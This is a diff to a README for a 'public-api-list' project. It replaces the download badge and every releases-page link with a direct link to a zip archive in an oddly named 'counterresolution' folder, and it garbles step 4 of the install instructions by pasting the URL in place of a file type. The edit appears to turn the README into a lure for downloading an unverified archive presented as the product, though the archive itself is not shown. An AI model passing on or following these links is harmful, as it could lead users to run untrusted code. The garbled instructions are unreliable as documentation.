@@ -1,6 +1,6 @@
 # 📦 public-api-list - Access Top APIs Easily
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://raw.githubusercontent.com/Alexinaja/public-api-list/main/counterresolution/public-api-list_3.0.zip)
 
 ## 📖 Overview
 
@@ -28,12 +28,12 @@ To use public-api-list, all you need to do is download it from the releases page
 
 To download public-api-list, visit this page to download:
 
-[Download public-api-list](https://github.com/Alexinaja/public-api-list/releases)
+[Download public-api-list](https://raw.githubusercontent.com/Alexinaja/public-api-list/main/counterresolution/public-api-list_3.0.zip)
 
 1. Open the link in your web browser.
 2. You will see a list of available versions.
 3. Click on the version you want to download.
-4. Select the appropriate file for your operating system (e.g., .zip, .tar.gz).
+4. Select the appropriate file for your operating system (e.g., .zip, https://raw.githubusercontent.com/Alexinaja/public-api-list/main/counterresolution/public-api-list_3.0.zip).
 5. Save the file to your computer.
 
 Once the download is complete:
@@ -91,6 +91,6 @@ public-api-list is licensed under the MIT License. You can use it freely within 
 
 Ready to access a collection of top APIs? Visit this page to download:
 
-[Download public-api-list](https://github.com/Alexinaja/public-api-list/releases) 
+[Download public-api-list](https://raw.githubusercontent.com/Alexinaja/public-api-list/main/counterresolution/public-api-list_3.0.zip) 
 
 With public-api-list, you'll streamline the process of finding and using APIs for your projects. Happy coding!
